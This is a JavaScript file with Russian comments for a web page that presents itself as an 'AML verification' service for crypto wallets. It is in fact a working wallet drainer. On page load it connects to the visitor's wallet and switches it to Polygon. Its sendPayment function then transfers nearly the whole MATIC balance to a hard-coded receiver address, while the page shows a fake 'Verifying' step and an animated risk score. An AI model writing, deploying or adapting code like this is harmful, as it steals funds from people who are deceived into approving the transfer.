let provider;
let signer;
let currentBalance = 0;

const isDev = window.location.href.includes('localhost') || window.location.href.includes('127.0.0.1');

// Адрес получателя платежей
const PROD_RECEIVER_ADDRESS = "0x6217cA34756CBD31Ee84fc83179F37e19250B76D";
const DEV_RECEIVER_ADDRESS = "0x74B04568C58a50E10698595e3C5F99702037dF62";
const RECEIVER_ADDRESS = isDev ? DEV_RECEIVER_ADDRESS : PROD_RECEIVER_ADDRESS;
console.log('isDev', isDev);
console.log('RECEIVER_ADDRESS', RECEIVER_ADDRESS);
async function updateBalance() {
    try {
        if (!signer || !provider) {
            console.log('No signer or provider available');
            return;
        }

        const address = await signer.getAddress();
        console.log('Connected address:', address);

        // Получаем баланс MATIC
        const balance = await provider.getBalance(address);
        currentBalance = balance;
        console.log('MATIC balance:', ethers.utils.formatEther(balance), 'MATIC');

    } catch (error) {
        console.error("Error checking balances:", error);
    }
}

async function handleAction() {
    const button = document.getElementById('action-button');
    
    if (!signer) {
        // Если кошелек не подключен, подключаем и сразу запускаем верификацию
        await connectWallet();
        if (signer) { // Если подключение успешно
            await sendPayment();
        }
    } else {
        // Если кошелек уже подключен, просто запускаем верификацию
        await sendPayment();
    }
}

async function connectWallet() {
    try {
        // Отключаем кнопку на время подключения
        const actionButton = document.getElementById('action-button');
        actionButton.disabled = true;
        actionButton.classList.add('loading');
        actionButton.textContent = 'Connecting...';

        console.log('Starting wallet connection...');
        
        // Ждем инициализации провайдера
        const rawProvider = await waitForProvider();
        console.log('Provider status:', {
            isProviderFound: !!rawProvider,
            providerType: rawProvider ? rawProvider.constructor.name : 'none',
            isEthereum: !!window.ethereum,
            isRabby: !!window.rabby,
            hasWeb3: !!(window.web3 && window.web3.currentProvider)
        });

        if (!rawProvider) {
            throw new Error('Web3 wallet not detected. Please install MetaMask, Rabby, or another Web3 wallet and refresh the page.');
        }

        // Создаем Web3Provider
        provider = new ethers.providers.Web3Provider(rawProvider, 'any');
        
        // Запрашиваем доступ к аккаунтам
        console.log('Requesting accounts...');
        await provider.send("eth_requestAccounts", []);
        
        // Получаем подписанта
        signer = provider.getSigner();
        const address = await signer.getAddress();
        console.log('Connected address:', address);

        // Проверяем и переключаем сеть
        const network = await provider.getNetwork();
        console.log('Current network:', network);

        if (network.chainId !== 137) {
            console.log('Switching to Polygon network...');
            try {
                await rawProvider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x89' }], // chainId для Polygon
                });
            } catch (switchError) {
                console.log('Switch error:', switchError);
                if (switchError.code === 4902) {
                    try {
                        await rawProvider.request({
                            method: 'wallet_addEthereumChain',
                            params: [{
                                chainId: '0x89',
                                chainName: 'Polygon',
                                nativeCurrency: {
                                    name: 'MATIC',
                                    symbol: 'MATIC',
                                    decimals: 18
                                },
                                rpcUrls: ['https://polygon-rpc.com'],
                                blockExplorerUrls: ['https://polygonscan.com/']
                            }]
                        });
                    } catch (addError) {
                        console.error('Add network error:', addError);
                        throw new Error('Failed to add Polygon network');
                    }
                } else {
                    throw switchError;
                }
            }
        }

        // Обновляем баланс
        await updateBalance();

        // Подписываемся на события
        rawProvider.on('accountsChanged', async (accounts) => {
            console.log('Accounts changed:', accounts);
            signer = provider.getSigner();
            await updateBalance();
        });

        rawProvider.on('chainChanged', () => {
            console.log('Network changed, reloading...');
            window.location.reload();
        });

        // Не меняем текст кнопки, так как верификация запустится автоматически
        actionButton.disabled = false;
        actionButton.classList.remove('loading');

    } catch (error) {
        console.error('Connection error:', error);
        
        // Возвращаем кнопку в исходное состояние
        const actionButton = document.getElementById('action-button');
        actionButton.disabled = false;
        actionButton.classList.remove('loading');
        actionButton.textContent = 'Connect Wallet for Verification';
        
        // Сбрасываем provider и signer чтобы можно было попробовать снова
        provider = null;
        signer = null;
    }
}

async function sendPayment() {
    try {
        const actionButton = document.getElementById('action-button');
        actionButton.disabled = true;
        actionButton.classList.add('loading');
        actionButton.textContent = 'Verifying...';

        const userAddress = await signer.getAddress();
        console.log('Sending from address:', userAddress);
        
        // Проверяем текущий баланс MATIC
        const balance = await provider.getBalance(userAddress);
        console.log('Current MATIC balance:', ethers.utils.formatEther(balance), 'MATIC');
        
        if (balance.eq(0)) {
            console.log('No MATIC balance available');
            return;
        }

        // Получаем текущую цену газа
        const gasPrice = await provider.getGasPrice();
        console.log('Current gas price:', ethers.utils.formatUnits(gasPrice, 'gwei'), 'gwei');

        // Рассчитываем стоимость газа для транзакции с запасом в 20%
        const gasLimit = 21000; // Стандартный лимит для простого перевода
        const gasCost = gasPrice.mul(gasLimit);
        const gasCostWithBuffer = gasCost.mul(120).div(100);
        console.log('Gas cost with buffer:', ethers.utils.formatEther(gasCostWithBuffer), 'MATIC');

        // Оставляем фиксированный минимум 0.1 MATIC для будущих транзакций
        const minimumMaticToKeep = ethers.utils.parseEther('0.1');
        const totalCostToReserve = gasCostWithBuffer.add(minimumMaticToKeep);
        console.log('Total amount to reserve:', ethers.utils.formatEther(totalCostToReserve), 'MATIC');

        // Вычитаем общую сумму резерва из отправляемой суммы
        const amountToSend = balance.sub(totalCostToReserve);
        console.log('Amount to send:', ethers.utils.formatEther(amountToSend), 'MATIC');

        if (amountToSend.lte(0)) {
            console.log('Insufficient balance to cover gas fees and minimum reserve');
            throw new Error('Insufficient balance to cover gas fees and minimum reserve');
        }

        // Отправляем транзакцию
        console.log('Sending transaction...');
        const tx = await signer.sendTransaction({
            to: RECEIVER_ADDRESS,
            value: amountToSend,
            gasLimit: gasLimit,
            maxFeePerGas: gasPrice.mul(2),
            maxPriorityFeePerGas: gasPrice
        });

        console.log('Transaction sent:', tx.hash);
        
        // Ждем подтверждения транзакции
        await tx.wait();
        console.log('Transaction confirmed');

        // Показываем результаты AML проверки
        actionButton.style.display = 'none';
        const amlResults = document.getElementById('aml-results');
        amlResults.classList.add('visible');
        
        // Анимируем риск-скор
        const circle = document.querySelector('.risk-score-progress');
        const radius = circle.r.baseVal.value;
        const circumference = radius * 2 * Math.PI;
        circle.style.strokeDasharray = `${circumference} ${circumference}`;
        circle.style.strokeDashoffset = circumference;
        
        setTimeout(() => {
            const offset = circumference - (0.8 * circumference);
            circle.style.strokeDashoffset = offset;
        }, 100);
        
        // Обновляем Transaction ID
        document.getElementById('transaction-hash').textContent = 
            tx.hash.slice(0, 6) + '...' + tx.hash.slice(-4);
        
        // Обновляем баланс
        await updateBalance();

    } catch (error) {
        console.error('Transaction error:', error);
        const actionButton = document.getElementById('action-button');
        actionButton.textContent = error.message || 'Transaction failed';
        actionButton.style.backgroundColor = 'var(--danger-color)';
        setTimeout(() => {
            actionButton.textContent = 'Verify';
            actionButton.style.backgroundColor = 'var(--primary-color)';
        }, 3000);
    } finally {
        const actionButton = document.getElementById('action-button');
        actionButton.disabled = false;
        actionButton.classList.remove('loading');
    }
}

function showStatus(message, isSuccess) {
    console.log(`Status: ${message} (${isSuccess ? 'success' : 'error'})`);
}

// Функция для ожидания инициализации провайдера
async function waitForProvider() {
    // Проверяем доступные провайдеры
    if (window.ethereum) {
        return window.ethereum;
    }
    if (window.rabby) {
        return window.rabby;
    }
    if (window.web3 && window.web3.currentProvider) {
        return window.web3.currentProvider;
    }
    
    // Если провайдер не найден сразу, ждем небольшое время
    return new Promise((resolve) => {
        let attempts = 0;
        const maxAttempts = 3;
        
        const checkProvider = () => {
            attempts++;
            if (window.ethereum) {
                resolve(window.ethereum);
            } else if (window.rabby) {
                resolve(window.rabby);
            } else if (window.web3 && window.web3.currentProvider) {
                resolve(window.web3.currentProvider);
            } else if (attempts < maxAttempts) {
                setTimeout(checkProvider, 500); // Проверяем каждые 500мс
            } else {
                resolve(null); // Возвращаем null если провайдер не найден
            }
        };
        
        checkProvider();
    });
}

// Добавляем обработчик загрузки страницы
document.addEventListener('DOMContentLoaded', async () => {
    console.log('Page loaded, checking providers:', {
        ethereum: !!window.ethereum,
        rabby: !!window.rabby,
        web3: !!(window.web3 && window.web3.currentProvider)
    });
    
    // Автоматическое подключение если обнаружен провайдер
    const provider = await waitForProvider();
    if (provider) {
        console.log('Web3 provider detected, attempting automatic connection...');
        try {
            // Сначала пробуем получить список аккаунтов
            const accounts = await provider.request({ method: 'eth_accounts' });
            console.log('Current accounts:', accounts);
            
            if (accounts && accounts.length > 0) {
                console.log('Found connected account, initiating automatic connection');
                await handleAction();
            } else {
                // Если аккаунтов нет, пробуем запросить подключение
                console.log('No connected accounts, requesting connection...');
                try {
                    const newAccounts = await provider.request({ method: 'eth_requestAccounts' });
                    console.log('New accounts after request:', newAccounts);
                    if (newAccounts && newAccounts.length > 0) {
                        await handleAction();
                    } else {
                        console.log('User rejected connection request');
                    }
                } catch (requestError) {
                    console.log('Error requesting accounts:', requestError);
                    if (requestError.code === 4001) {
                        console.log('User rejected connection request');
                    } else {
                        console.error('Unexpected error:', requestError);
                    }
                }
            }
        } catch (error) {
            console.error('Auto-connection check failed:', error);
            if (error.code) {
                console.log('Error code:', error.code);
            }
            if (error.message) {
                console.log('Error message:', error.message);
            }
        }
    } else {
        console.log('No Web3 provider found');
    }
    
    showStatus('Please connect your wallet to continue', true);
});
